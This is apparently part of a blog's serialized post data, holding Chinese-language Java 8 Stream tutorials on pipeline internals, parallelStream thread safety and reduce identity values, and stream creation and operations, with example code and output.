上述代码完美的展现了Sink的四个接口方法是如何协同工作的： \n 首先beging()方法告诉Sink参与排序的元素个数，方便确定中间结果容器的的大小；\n之后通过accept()方法将元素添加到中间结果当中，最终执行时调用者会不断调用该方法，直到遍历所有元素；\n最后end()方法告诉Sink所有元素遍历完毕，启动排序步骤，排序完成后将结果传递给下游的Sink；\n如果下游的Sink是短路操作，将结果传递给下游时不断询问下游cancellationRequested()是否可以结束处理。 \n 叠加之后的操作如何执行？ \n \n Sink完美封装了Stream每一步操作，并给出了[处理->转发]的模式来叠加操作。这一连串的齿轮已经咬合，就差最后一步拨动齿轮启动执行。是什么启动这一连串的操作呢？也许你已经想到了启动的原始动力就是结束操作(Terminal Operation)，一旦调用某个结束操作，就会触发整个流水线的执行。 \n 结束操作之后不能再有别的操作，所以结束操作不会创建新的流水线阶段(Stage)，直观的说就是流水线的链表不会在往后延伸了。结束操作会创建一个包装了自己操作的Sink，这也是流水线中最后一个Sink，这个Sink只需要处理数据而不需要将结果传递给下游的Sink（因为没有下游）。对于Sink的[处理->转发]模型，结束操作的Sink就是调用链的出口。 \n 我们再来考察一下上游的Sink是如何找到下游Sink的。一种可选的方案是在PipelineHelper中设置一个Sink字段，在流水线中找到下游Stage并访问Sink字段即可。但Stream类库的设计者没有这么做，而是设置了一个Sink AbstractPipeline.opWrapSink(int flags, Sink downstream)方法来得到Sink，该方法的作用是返回一个新的包含了当前Stage代表的操作以及能够将结果传递给downstream的Sink对象。为什么要产生一个新对象而不是返回一个Sink字段？这是因为使用opWrapSink()可以将当前操作与下游Sink（上文中的downstream参数）结合成新Sink。试想只要从流水线的最后一个Stage开始，不断调用上一个Stage的opWrapSink()方法直到最开始（不包括stage0，因为stage0代表数据源，不包含操作），就可以得到一个代表了流水线上所有操作的Sink，用代码表示就是这样： \n // AbstractPipeline.wrapSink() \n // 从下游向上游不断包装Sink。如果最初传入的sink代表结束操作， \n // 函数返回时就可以得到一个代表了流水线上所有操作的Sink。 \n final   < P_IN >   Sink < P_IN >   wrapSink ( Sink < E_OUT >  sink )   { \n     . . . \n     for   ( AbstractPipeline  p = AbstractPipeline . this ;  p . depth  >   0 ;  p = p . previousStage )   { \n        sink  =  p . opWrapSink ( p . previousStage . combinedFlags ,  sink ) ; \n     } \n     return   ( Sink < P_IN > )  sink ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 现在流水线上从开始到结束的所有的操作都被包装到了一个Sink里，执行这个Sink就相当于执行整个流水线，执行Sink的代码如下： \n // AbstractPipeline.copyInto(), 对spliterator代表的数据执行wrappedSink代表的操作。 \n final   < P_IN >   void   copyInto ( Sink < P_IN >  wrappedSink ,   Spliterator < P_IN >  spliterator )   { \n     . . . \n     if   ( ! StreamOpFlag . SHORT_CIRCUIT . isKnown ( getStreamAndOpFlags ( ) ) )   { \n        wrappedSink . begin ( spliterator . getExactSizeIfKnown ( ) ) ; // 通知开始遍历 \n        spliterator . forEachRemaining ( wrappedSink ) ; // 迭代 \n        wrappedSink . end ( ) ; // 通知遍历结束 \n     } \n     . . . \n } \n \n 1 2 3 4 5 6 7 8 9 10 上述代码首先调用wrappedSink.begin()方法告诉Sink数据即将到来，然后调用spliterator.forEachRemaining()方法对数据进行迭代（Spliterator是容器的一种迭代器，参阅），最后调用wrappedSink.end()方法通知Sink数据处理结束。逻辑如此清晰。 \n 执行后的结果在哪里？ \n 最后一个问题是流水线上所有操作都执行后，用户所需要的结果（如果有）在哪里？首先要说明的是不是所有的Stream结束操作都需要返回结果，有些操作只是为了使用其副作用(Side-effects)，比如使用Stream.forEach()方法将结果打印出来就是常见的使用副作用的场景（事实上，除了打印之外其他场景都应避免使用副作用），对于真正需要返回结果的结束操作结果存在哪里呢？ \n 特别说明：副作用不应该被滥用，也许你会觉得在Stream.forEach()里进行元素收集是个不错的选择，就像下面代码中那样，但遗憾的是这样使用的正确性和效率都无法保证，因为Stream可能会并行执行。大多数使用副作用的地方都可以使用归约操作更安全和有效的完成。\n \n // 错误的收集方式 \n ArrayList < String >  results  =   new   ArrayList < > ( ) ; \nstream . filter ( s  ->  pattern . matcher ( s ) . matches ( ) ) \n       . forEach ( s  ->  results . add ( s ) ) ;    // Unnecessary use of side-effects! \n // 正确的收集方式 \n List < String > results  = \n     stream . filter ( s  ->  pattern . matcher ( s ) . matches ( ) ) \n              . collect ( Collectors . toList ( ) ) ;    // No side-effects! \n \n 1 2 3 4 5 6 7 8 回到流水线执行结果的问题上来，需要返回结果的流水线结果存在哪里呢？这要分不同的情况讨论，下表给出了各种有返回结果的Stream结束操作。 \n 返回类型  对应的结束操作\nboolean anyMatch() allMatch() noneMatch()\nOptional  findFirst() findAny()\n归约结果  reduce() collect()\n数组  toArray()\n 返回类型 对应的结束操作 boolean anyMatch() allMatch() noneMatch() Optional findFirst() findAny() 归约结果 reduce() collect() 数组 toArray() \n \n 对于表中返回boolean或者Optional的操作（Optional是存放 一个 值的容器）的操作，由于值返回一个值，只需要在对应的Sink中记录这个值，等到执行结束时返回就可以了。 \n 对于归约操作，最终结果放在用户调用时指定的容器中（容器类型通过收集器指定）。collect(), reduce(), max(), min()都是归约操作，虽然max()和min()也是返回一个Optional，但事实上底层是通过调用reduce()方法实现的。 \n 对于返回是数组的情况，毫无疑问的结果会放在数组当中。这么说当然是对的，但在最终返回数组之前，结果其实是存储在一种叫做Node的数据结构中的。Node是一种多叉树结构，元素存储在树的叶子当中，并且一个叶子节点可以存放多个元素。这样做是为了并行执行方便。关于Node的具体结构，我们会在下一节探究Stream如何并行执行时给出详细说明。 \n 结语 \n 本文详细介绍了Stream流水线的组织方式和执行过程，学习本文将有助于理解原理并写出正确的Stream代码，同时打消你对Stream API效率方面的顾虑。如你所见，Stream API实现如此巧妙，即使我们使用外部迭代手动编写等价代码，也未必更加高效。 \n 参考链接 \n \n 关于Java Lambda表达式看这一篇就够了 \n Java8之Stream/Map以及Lambda \n \n'},{title:"关于Java8 parallelStream并发安全的思考",frontmatter:{title:"关于Java8 parallelStream并发安全的思考",date:"2022-02-20T19:19:28.000Z",tags:["java8","stream","parallel"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java8_parallelStream.html",relativePath:"blogs/java/java8_parallelStream.md",key:"v-498fee96",path:"/blogs/java/java8_parallelStream.html",headers:[{level:2,title:"背景",slug:"背景"},{level:2,title:"Java8的paralleStream是线程安全的吗",slug:"java8的parallestream是线程安全的吗"},{level:2,title:"reduce 示例",slug:"reduce-示例"},{level:2,title:"ForkJoinPool",slug:"forkjoinpool"},{level:2,title:"注意事项",slug:"注意事项"},{level:3,title:"Reduce 应当可拆分",slug:"reduce-应当可拆分"},{level:3,title:"合理采用并行流",slug:"合理采用并行流"},{level:3,title:"编写单元测试",slug:"编写单元测试"},{level:2,title:"参考链接",slug:"参考链接"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 背景 \n Java8的stream接口极大地减少了for循环写法的复杂性，stream提供了map/reduce/collect等一系列聚合接口，还支持并发操作：parallelStream。 \n 在爬虫开发过程中，经常会遇到遍历一个很大的集合做重复的操作，这时候如果使用串行执行会相当耗时，因此一般会采用多线程来提速。Java8的paralleStream用fork/join框架提供了并发执行能力。但是如果使用不当，很容易陷入误区。 \n Java8的paralleStream是线程安全的吗 \n 一个简单的例子,在下面的代码中采用stream的forEach接口对1-10000进行遍历，分别插入到3个ArrayList中。其中对第一个list的插入采用串行遍历，第二个使用paralleStream，第三个使用paralleStream的同时用ReentryLock对插入列表操作进行同步： \n    private   static   List < Integer >  list1  =   new   ArrayList < > ( ) ; \n   private   static   List < Integer >  list2  =   new   ArrayList < > ( ) ; \n   private   static   List < Integer >  list3  =   new   ArrayList < > ( ) ; \n   private   static   List < Integer >  list4  =   new   ArrayList < > ( ) ; \n   private   static   Lock  lock  =   new   ReentrantLock ( ) ; \n\n   public   static   void   main ( String [ ]  args )   { \n   IntStream . range ( 0 ,   10000 ) . forEach ( list1 :: add ) ; \n\n   IntStream . range ( 0 ,   1000 ) . parallel ( ) . forEach ( list2 :: add ) ; \n  list4  =   IntStream . range ( 0 ,   10000 ) . parallel ( ) . mapToObj ( i  ->  i ) . collect ( Collectors . toList ( ) ) ; \n   IntStream . range ( 0 ,   10000 ) . forEach ( i  ->   { \n    lock . lock ( ) ; \n     try   { \n    list3 . add ( i ) ; \n     }   finally   { \n    lock . unlock ( ) ; \n     } \n   } ) ; \n\n  list4  =   IntStream . range ( 0 ,   10000 ) . parallel ( ) . mapToObj ( i  ->  i ) . collect ( Collectors . toList ( ) ) ; \n   System . out . println ( "串行执行的大小："   +  list1 . size ( ) ) ; \n   System . out . println ( "并行执行的大小："   +  list2 . size ( ) ) ; \n   System . out . println ( "加锁并行执行的大小："   +  list3 . size ( ) ) ; \n   System . out . println ( "collect并行执行的大小："   +  list3 . size ( ) ) ; \n   } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 执行结果： \n 串行执行的大小：10000\n并行执行的大小：984\n加锁并行执行的大小：10000\ncollect并行执行的大小：10000\n \n 1 2 3 4 并且每次的结果中并行执行的大小不一致，而串行和加锁后的结果一直都是正确结果。显而易见，stream.parallel.forEach()中执行的操作并非线程安全。 \n 那么既然paralleStream不是线程安全的，是不是在其中的进行的非原子操作都要加锁呢？我在stackOverflow上找到了答案： \n \n \n using-java-8-parallel-streams \n \n \n parallel-streams-collectors-and-thread-safety \n \n \n 在上面两个问题的解答中，证实paralleStream的forEach接口确实不能保证同步，同时也提出了解决方案：使用collect和reduce接口。 \n parallelism \n 在Javadoc中也对stream的并发操作进行了相关介绍： \n The Collections Framework provides synchronization wrappers, which add automatic synchronization to an arbitrary collection, making it thread-safe.\n \n Collections框架提供了同步的包装，使得其中的操作线程安全。 \n 那么reduce也能保证线程安全吗，我们在进行如下测试。 \n reduce 示例 \n 现在给你一组指定的数组，需要你计算出每个数字的乘积。这种情况我们采用 stream 可以用一个链式代码直接一步到位，省去了写 for 循环的这样臃肿的代码。 \n   public   static   void   main ( String [ ]  args )   { \n         long [ ]  array  =   new   long [ ] { 3 ,   123 ,   1 ,   31 ,   56 ,   61 ,   22 } ; \n         long  total  =   Arrays . stream ( array ) \n                 . reduce ( 1 ,   ( acc ,  next )   ->  acc  *  next ) ; \n         System . out . println ( total ) ; \n     } \n \n 1 2 3 4 5 6 如果我们拿到的结果还需要乘以一个固定的数字 m ，那么我们只需要修改代码为： \n   int  total  =   Arrays . stream ( array ) \n                 . reduce ( m ,   ( acc ,  next )   ->  acc  *  next ) ; \n\n \n 1 2 3 如果数字过多串行流的顺序执行会不会导致效率很低呢？于是我又尝试采用 parallel() 来执行程序 \n   public   static   void   main ( String [ ]  args )   { \n         long [ ]  array  =   new   long [ ] { 3 ,   123 ,   1 ,   31 ,   56 ,   61 ,   22 } ; \n         long  total  =   Arrays . stream ( array ) \n                 . parallel ( ) \n                 . reduce ( 1 ,   ( acc ,  next )   ->  acc  *  next ) ; \n         System . out . println ( total ) ; \n     } \n\n \n 1 2 3 4 5 6 7 8 意外的发现，当 m=1 的时候，串行流和并行流取得的结果是一致的，而当 m 不为 1 时，两者的结果并不匹配。比如当 m=3 的时候，串行流的运算结果为 2578991184 而并行流的运算结果为 1880084573136 。是什么导致了这样的误差呢？ \n ForkJoinPool \n Java Streams 默认使用同一个 ForkJoinPool 执行并行流。 ForkJoinPool 主要就是将任务递归拆分为多个块，然后可以独立地计算每个块。 \n Stream.reduce 顺序执行的时候是这样的： \n \n 并行流的算法其实也非常简单，我们假设任务仅被分成 2 部分： \n \n 每个块都多乘了一次 m ，并行流给每个任务块都应用了给定的标识 m 。知道了这个刚刚的 bug 我们也就可以解决了。我们可以将每个标识 m 都采用 1 ，乘 1 并不会影响程序结果，然后得到最后的结果只会再乘以 m ： \n   public   static   void   main ( String [ ]  args )   { \n         long [ ]  array  =   new   long [ ] { 3 ,   123 ,   1 ,   31 ,   56 ,   61 ,   22 } ; \n         long  total  =   Arrays . stream ( array ) \n                 . parallel ( ) \n                 . reduce ( 1 ,   ( acc ,  next )   ->  acc  *  next )   *  m ; \n         System . out . println ( total ) ; \n     } \n\n \n 1 2 3 4 5 6 7 8 #  注意事项 \n 再使用流的时候，有哪些小细节应该注意呢。 \n \n \n 应用到并行流的任何操作都必须是符合缩减操作的三个约束条件，无状态，不干预，关联性！因为这三大约束确保在并行流上执行操作的结果和在顺序流上执行的结果是相同的 \n \n \n paralleStream里直接去修改变量是非线程安全的，但是采用collect和reduce操作就是满足线程安全的了。 \n \n \n 在采用并行流收集元素到集合中时，最好调用collect方法，一定不要采用Foreach方法或者map方法。 \n \n \n 当对方法替换的同时，必须关注方法处理的过程中，是否用到线程不安全的类型例如HashMap,ArrayList等待，方法内部使用不会出现线程安全问题，当变量在方法外部定义尤为重要，使用并行流需谨慎，时刻考虑线程安全问题。否则可能造成程序死锁，或数据的准确性。造成的后果完全取决于使用非线程安全类的效果。 \n \n \n parallelStream默认采用forkjoin底层实现，线程池的数量取决于计算机的核数。\n比如当数据量不大时，顺序执行往往比并行执行更快，毕竟准备线程池和相关资源也是需要时间的。\n再比如当任务涉及到I/O操作并且任务之间不互相依赖时，那么并行化就是一个不错的选择。 \n Reduce 应当可拆分 \n 如果不确定流是串行流（比如它作为函数参数来提供），则 reduce 函数的 identity 不应影响单个任务块的结果。即求和函数的 identity 必须为 0 ，而求乘积的 identity 必须为 1。 \n 合理采用并行流 \n 并不是所有流操作都应该并行化。例如 map ，flatMap 和 filter 是无状态的，因此我们可以采用并行流的做法。而 sort ，distinct 和 limit 不但不会带来性能提升，反而可能会引发错误。\n并且，并行化的有效性在很大程度上取决于流的来源。 ArrayList ，array 或IntStream.range 支持随机访问，这意味着它们可以轻松拆分。但是 LinkedList 分解需要 O(n) 时间。还有 Stream.iterate 和 BufferedReader 也要尽量避免采用并行流，因为它们的开头都有未知的长度，因此很难估算拆分来源。 \n 编写单元测试 \n 并行流虽然具备潜在的性能优势，但是同时也可能带来一些致命的错误，因此，每次将串行流替换为并行流时，为了确保功能未被破坏。需要编写一定的单元侧试。 \n 参考链接 \n \n 跟我学 Java 8 新特性之 Stream 流（四）并行流 \n \n'},{title:"Java8中 Stream创建流的四种方式、流的基本操作（流计算）",frontmatter:{title:"Java8中 Stream创建流的四种方式、流的基本操作（流计算）",date:"2022-02-15T10:10:29.000Z",tags:["java8","stream"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java8_stream_create_proccess.html",relativePath:"blogs/java/java8_stream_create_proccess.md",key:"v-a4510a56",path:"/blogs/java/java8_stream_create_proccess.html",headers:[{level:2,title:"Java对函数式编程的重视程度，看看Java 8加入函数式编程扩充多少功能就清楚了。Java 8之所以费这么大功夫引入函数式编程，原因有二：",slug:"java对函数式编程的重视程度-看看java-8加入函数式编程扩充多少功能就清楚了。java-8之所以费这么大功夫引入函数式编程-原因有二"},{level:2,title:"虽然大部分情况下stream是容器调用Collection.stream()方法得到的，但stream和collections有以下不同：",slug:"虽然大部分情况下stream是容器调用collection-stream-方法得到的-但stream和collections有以下不同"},{level:2,title:"对stream的操作分为为两类，中间操作(intermediate operations)和结束操作(terminal operations)，二者特点是：",slug:"对stream的操作分为为两类-中间操作-intermediate-operations-和结束操作-terminal-operations-二者特点是"},{level:2,title:"Stream api",slug:"stream-api"},{level:2,title:"一 创建里Stream 流的若干种方式",slug:"一-创建里stream-流的若干种方式"},{level:3,title:"通过Collection得Stream（）方法（串行流）或者 parallelStream（）方法（并行流）创建Stream",slug:"通过collection得stream-方法-串行流-或者-parallelstream-方法-并行流-创建stream"},{level:3,title:"通过Stream类中得 of（）静态方法获取流",slug:"通过stream类中得-of-静态方法获取流"},{level:3,title:"通过Arrays中得静态方法stream（）",slug:"通过arrays中得静态方法stream"},{level:3,title:"创建无限流(迭代、生成)",slug:"创建无限流-迭代、生成"},{level:3,title:"使用Pattern",slug:"使用pattern"},{level:3,title:"使用Files.lines",slug:"使用files-lines"},{level:2,title:"操作",slug:"操作"},{level:2,title:"二 Stream 中间操作",slug:"二-stream-中间操作"},{level:3,title:"1 筛选切片",slug:"_1-筛选切片"},{level:2,title:"三 Stream 终止操作",slug:"三-stream-终止操作"},{level:3,title:"1 查找与匹配",slug:"_1-查找与匹配"},{level:3,title:"2 归约 : 可以将流中元素反复结合在一起，得到一个值",slug:"_2-归约-可以将流中元素反复结合在一起-得到一个值"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' Java对函数式编程的重视程度，看看Java 8加入函数式编程扩充多少功能就清楚了。Java 8之所以费这么大功夫引入函数式编程，原因有二： \n \n 代码简洁函数式编程写出的代码简洁且意图明确，使用stream接口让你从此告别for循环。 \n 多核友好，Java函数式编程使得编写并行程序从未如此简单，你需要的全部就是调用一下parallel()方法。 \n \n 这一节我们学习stream，也就是Java函数式编程的主角。对于Java 7来说stream完全是个陌生东西，stream并不是某种数据结构，它只是数据源的一种视图。这里的数据源可以是一个数组，Java容器或I/O channel等。正因如此要得到一个stream通常不会手动创建，而是调用对应的工具方法。 \n 虽然大部分情况下stream是容器调用Collection.stream()方法得到的，但stream和collections有以下不同： \n \n 无存储。stream不是一种数据结构，它只是某种数据源的一个视图，数据源可以是一个数组，Java容器或I/O channel等。 \n 为函数式编程而生。对stream的任何修改都不会修改背后的数据源，比如对stream执行过滤操作并不会删除被过滤的元素，而是会产生一个不包含被过滤元素的新stream。 \n 惰式执行。stream上的操作并不会立即执行，只有等到用户真正需要结果的时候才会执行。 \n 可消费性。stream只能被“消费”一次，一旦遍历过就会失效，就像容器的迭代器那样，想要再次遍历必须重新生成。 \n 对stream的操作分为为两类，中间操作(intermediate operations)和结束操作(terminal operations)，二者特点是： \n \n 中间操作总是会惰式执行，调用中间操作只会生成一个标记了该操作的新stream，仅此而已。 \n 结束操作会触发实际计算，计算发生时会把所有中间操作积攒的操作以pipeline的方式执行，这样可以减少迭代次数。计算完成之后stream就会失效。 \n \n 如果你熟悉Apache Spark RDD，对stream的这个特点应该不陌生。 \n 下表汇总了Stream接口的部分常见方法： \n \n \n \n 操作类型 \n 接口方法 \n \n \n \n \n 中间操作 \n concat() distinct() filter() flatMap() limit() map() peek()  skip() sorted() parallel() sequential() unordered() \n \n \n 结束操作 \n allMatch() anyMatch() collect() count() findAny() findFirst()  forEach() forEachOrdered() max() min() noneMatch() reduce() toArray() \n Stream api \n **Stream api 是java8 中提供的对集合处理的api ， 对数据进行一系列的中间操作，元数据不会发生改变\n                集合讲的是数据， 流 讲的是计算（用于操作数据源，集合，数组）所生成的元素序列。**\n\n         Stream API位于 java.util.stream.* 包下。\n \n 1 2 3 4 1. Stream 自己不会存储元素\n2. Stream 不会改变源对象。相反，他们会返回一个持有结果的Stream 。\n3. Stream 操作是延迟执行的。这以为这他们会等到需要结果的时候才执行（延迟加载）。\n 一 创建里Stream 流的若干种方式 \n 通过Collection得Stream（）方法（串行流）或者 parallelStream（）方法（并行流）创建Stream \n List \n List < String >  list  =   Arrays . asList ( "A" ,   "B" ,   "C" ) ; \n Stream < String >  stream4  =  list . stream ( ) ; \n System . out . println ( "stream4:"   +  stream4 . collect ( joining ( ) ) ) ; \n \n 1 2 3 程序输出： \n stream4:ABC\n Set \n Set < String >  set  =   new   HashSet < > ( Arrays . asList ( "A" ,   "B" ,   "C" ) ) ; \n Stream < String >  stream5  =  set . stream ( ) ; \n System . out . println ( "stream5:"   +  stream5 . collect ( joining ( ) ) ) ; \n \n 1 2 3 程序输出： \n stream5:ABC\n Map \n Map < String ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( "1" ,   "A" ) ; \nmap . put ( "2" ,   "B" ) ; \nmap . put ( "3" ,   "C" ) ; \n Stream < String >  stream6  =  map . values ( ) . stream ( ) ; \n System . out . println ( "stream6:"   +  stream6 . collect ( Collectors . joining ( ) ) ) ; \n\nmap . entrySet ( ) . stream ( ) ; \nmap . keySet ( ) . stream ( ) ; \n \n 1 2 3 4 5 6 7 8 9 程序输出： \n stream6:ABC\n 通过Stream类中得 of（）静态方法获取流 \n Stream.of 可变参数 \n Stream < String >  stream1  =   Stream . of ( "A" ,   "B" ,   "C" ) ; \n System . out . println ( "stream1:"   +  stream1 . collect ( Collectors . joining ( ) ) ) ; \n \n 1 2 程序输出： \n stream1:ABC\n Stream.of 数组 \n String [ ]  values  =   new   String [ ] { "A" ,   "B" ,   "C" } ; \n Stream < String >  stream2  =   Stream . of ( values ) ; \n System . out . println ( "stream2:"   +  stream2 . collect ( Collectors . joining ( ) ) ) ; \n \n 1 2 3 程序输出： \n stream2:ABC\n \n 看 Stream.of 源码，上面这两种方式其实就是下面那种的包装版。 \n public   static < T >   Stream < T >   of ( T . . .  values )   { \n     return   Arrays . stream ( values ) ; \n } \n \n 1 2 3 我们直接使用源码中的方式也是一样的。 \n 通过Arrays中得静态方法stream（） \n String [ ]  values  =   new   String [ ] { "A" ,   "B" ,   "C" } ; \n Stream < String >  stream3  =   Arrays . stream ( values ) ; \n System . out . println ( "stream3:"   +  stream3 . collect ( Collectors . joining ( ) ) ) ; \n \n 1 2 3 程序输出： \n stream3:ABC\n 创建无限流(迭代、生成) \n       //迭代（需要传入一个种子，也就是起始值，然后传入一个一元操作） \n      Stream < Integer >  stream1  =   Stream . iterate ( 2 ,   ( x )   ->  x  *   2 ) ; \n\n      //生成(无限产生对象) \n      Stream < Double >  stream2  =   Stream . generate ( ( )   ->   Math . random ( ) ) ; \n\n \n 1 2 3 4 5 6 也可以使用limit指定生成元素个数 \n Stream < String >  stream7  =   Stream . iterate ( "A" ,  e  ->   String . valueOf ( ( char )   ( e . charAt ( 0 )   +   1 ) ) ) . limit ( 3 ) ; \n System . out . println ( "stream7:"   +  stream7 . collect ( Collectors . joining ( ) ) ) ; \n \n 1 2 #  使用Pattern \n String  value  =   "A B C" ; \n Stream < String >  stream8  =   Pattern . compile ( "\\\\W" ) . splitAsStream ( value ) ; \n System . out . println ( "stream8:"   +  stream8 . collect ( Collectors . joining ( ) ) ) ; \n \n 1 2 3 程序输出： \n stream8:ABC\n 使用Files.lines \n try   { \n     Stream < String >  stream9  =   Files . lines ( Paths . get ( "d:/data.txt" ) ) ; \n     System . out . println ( "stream9:"   +  stream9 . collect ( Collectors . joining ( ) ) ) ; \n }   catch   ( IOException  e )   { \n    e . printStackTrace ( ) ; \n } \n \n 1 2 3 4 5 6 data.txt文件内容如下： \n A\nB\nC\n \n 1 2 3 程序输出： \n stream9:ABC\n 操作 \n 二 Stream 中间操作 \n 多个中间操作可以连接起来形成一个流水线，除非流水线终止操作，否则中间操作不会执行任何处理。\n终止操作时一次性全部处理，称为“延迟加载”\n 1 筛选切片 \n \n 过滤 \n \n List < String >  list  =   Arrays . asList ( "1" , "2" , "3" , "4" , "0" , "222" , "33" ) ; \n Stream < String >  stream  =  list . stream ( ) . filter ( ( x )   ->   { \n             System . out . println ( " api  中间操作。" ) ; \n             return  x . equals ( "3" ) ; \n         } ) ; \n         //终止操作：只有执行终止操作才会执行全部。即：延迟加载 \n        stream . forEach ( System . out :: println ) ; \n \n 1 2 3 4 5 6 7 结果 \n  api  中间操作。\n api  中间操作。\n api  中间操作。\n3\n api  中间操作。\n api  中间操作。\n api  中间操作。\n api  中间操作。\n \n 1 2 3 4 5 6 7 8 \n limit() 截断流，使其元素不超过给定数量。 \n \n List < String >  list  =   Arrays . asList ( "1" , "2" , "3" , "4" , "0" , "222" , "33" , "3" , "3" ) ; \n  Stream < String >  stream  =  list . stream ( ) . filter ( ( x )   ->   { \n             System . out . println ( " api  中间操作。" ) ; \n             return  x . equals ( "3" ) ; \n         } ) ; \n         //取两个 ， 可以配合其他得中间操作，并截断流，取到相应的元素个数，这不会往下执行，可以提高效率 \n        stream . limit ( 2 ) . forEach ( System . out :: println ) ; \n \n 1 2 3 4 5 6 7 \n skip(n) 跳过元素 \n \n skip（n），返回一个扔掉了前n个元素的流。若流中元素不足n个，则返回一个空，与limit（n）互补。 \n List < String >  list  =   Arrays . asList ( "1" , "2" , "3" , "4" , "0" , "222" , "33" , "3" , "3" ) ; \n         Stream < String >  stream  =  list . stream ( ) . filter ( ( x )   ->   { \n             System . out . println ( " api  中间操作。" ) ; \n             return  x . equals ( "3" ) ; \n         } ) ; \n         //skip（n），返回一个扔掉了前n个元素的流。若流中元素不足n个，则返回一个空，与limit（n）互补。 \n        stream . skip ( 3 ) . limit ( 1 ) . forEach ( System . out :: println ) ; \n \n 1 2 3 4 5 6 7 \n 筛选 \n \n distinct 通过流所生成元素的hashCode（）和equals（）去除重复元素 \n List < String >  list  =   Arrays . asList ( "1" , "2" , "3" , "4" , "0" , "222" , "33" , "3" , "3" ) ; \n  Stream < String >  stream  =  list . stream ( ) ; \n        stream . distinct ( ) . forEach ( System . out :: println ) ; \n \n 1 2 3 1\n2\n3\n4\n0\n222\n33\n \n 1 2 3 4 5 6 7 \n 映射 \n \n map - 接受lambda 将元素转换为其他形式或提取信息。\n接受一个函数作为参数，该函数会被应用到每个元素上，并将其映射成一个新元素 \n flatMap 接受一个函数作为参数，将流中的每个值都转成另一个流，然后把所有流连成一个流 \n List < Stu >  stuList  =   Arrays . asList ( new   Stu ( "a" , 1 ) , new   Stu ( "ab" , 3 ) , new   Stu ( "c" , 11 ) , new   Stu ( "f" , 12 ) ) ; \n\n    Stream < Stu >  stream  =  stuList . stream ( ) ; \n         //取出list中所有的年龄 \n        stream . map ( Stu :: getAge ) . forEach ( System . out :: println ) ; \n         //把所有年龄再返回一个集合 \n         List < Integer >  collect  =  stream . map ( Stu :: getAge ) . collect ( Collectors . toList ( ) ) ; \n\n        stream . flatMap ( stu  ->  test1 . filterCharacter ( stu . getName ( ) ) ) . forEach ( System . out :: println ) ; \n \n 1 2 3 4 5 6 7 8 9 \n 排序 \n \n sorted有两种方法，一种是不传任何参数，叫自然排序，还有一种需要传Comparator 接口参数，叫做定制排序 \n          //自然排序 \n         List < String >  collect  =  list . stream ( ) . sorted ( ) . collect ( Collectors . toList ( ) ) ; \n\n         //定制排序 \n         List < String >  collect2  =  list . stream ( ) . sorted ( ( o1 ,  o2 )   ->   { \n             if ( o1 . length ( ) > o2 . length ( ) ) { \n                 return   1 ; \n             } else \n             if ( o1 . length ( ) < o2 . length ( ) ) { \n                 return   - 1 ; \n             } else   { \n                 return   0 ; \n             } \n         } ) . collect ( Collectors . toList ( ) ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #  三 Stream 终止操作 \n 实体类 \n public   class   Person   { \n     String  name  ; \n     String  sex  ; \n     int  age ; \n     Status  statusEnum ; \n\n     public   Person ( String  name ,   String  sex ,   int  age ,   Status  statusEnum )   { \n         this . name  =  name ; \n         this . sex  =  sex ; \n         this . age  =  age ; \n         this . statusEnum  =  statusEnum ; \n     } \n\n     public   String   getName ( )   { \n         return  name ; \n     } \n\n     public   void   setName ( String  name )   { \n         this . name  =  name ; \n     } \n\n     public   String   getSex ( )   { \n         return  sex ; \n     } \n\n     public   void   setSex ( String  sex )   { \n         this . sex  =  sex ; \n     } \n\n     public   int   getAge ( )   { \n         return  age ; \n     } \n\n     public   void   setAge ( int  age )   { \n         this . age  =  age ; \n     } \n\n     public   Status   getStatusEnum ( )   { \n         return  statusEnum ; \n     } \n\n     public   void   setStatusEnum ( Status  statusEnum )   { \n         this . statusEnum  =  statusEnum ; \n\n } \n\n     @Override \n     public   String   toString ( )   { \n         return   "Person{"   + \n                 "name=\'"   +  name  +   \'\\\'\'   + \n                 ", sex=\'"   +  sex  +   \'\\\'\'   + \n                 ", age="   +  age  + \n                 ", statusEnum="   +  statusEnum  + \n                 \'}\' ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 操作 \n   List < Person >  persons  =   Arrays . asList ( \n                           new   Person ( "张三" ,   "男" ,   76 ,   Status . FREE ) , \n               new   Person ( "李四" ,   "女" ,   12 ,   Status . BUSY ) , \n                new   Person ( "王五" ,   "男" ,   35 ,   Status . BUSY ) , \n                new   Person ( "赵六" ,   "男" ,   3 ,   Status . FREE ) , \n                new   Person ( "钱七" ,   "男" ,   56 ,   Status . BUSY ) , \n                new   Person ( "翠花" ,   "女" ,   34 ,   Status . VOCATION ) , \n                new   Person ( "翠花" ,   "女" ,   34 ,   Status . FREE ) , \n                new   Person ( "翠花" ,   "女" ,   34 ,   Status . VOCATION ) \n               ) ; \n \n 1 2 3 4 5 6 7 8 9 10 #  1 查找与匹配 \n \n allMatch —— 检查是否匹配所有元素。 \n \n      public   void   test1 ( ) { \n         boolean  allMatch  =  persons . stream ( ) . allMatch ( ( x )   ->   { \n             return  x . getStatusEnum ( ) . equals ( Status . FREE ) ; \n         } ) ; \n\n         System . out . println ( allMatch ) ; \n     } \n \n 1 2 3 4 5 6 7 \n anyMatch —— 检查是否至少匹配一个元素。 \n \n      public   void   test2 ( ) { \n         boolean  allMatch  =  persons . stream ( ) . anyMatch ( ( x )   ->   { \n             return  x . getStatusEnum ( ) . equals ( Status . FREE ) ; \n         } ) ; \n\n         System . out . println ( allMatch ) ; \n     } \n \n 1 2 3 4 5 6 7 \n noneMatch —— 检查是否没有匹配所有元素。 \n \n 检查 所有的是否都是 FREE  ----- 结果是false \n      public   void   test3 ( ) { \n         boolean  allMatch  =  persons . stream ( ) . noneMatch ( ( x )   ->   { \n             return  x . getStatusEnum ( ) . equals ( Status . FREE ) ; \n         } ) ; \n\n         System . out . println ( allMatch ) ; \n     } \n \n 1 2 3 4 5 6 7 \n findFirst —— 返回第一个元素。 \n \n   public   void   test4 ( ) 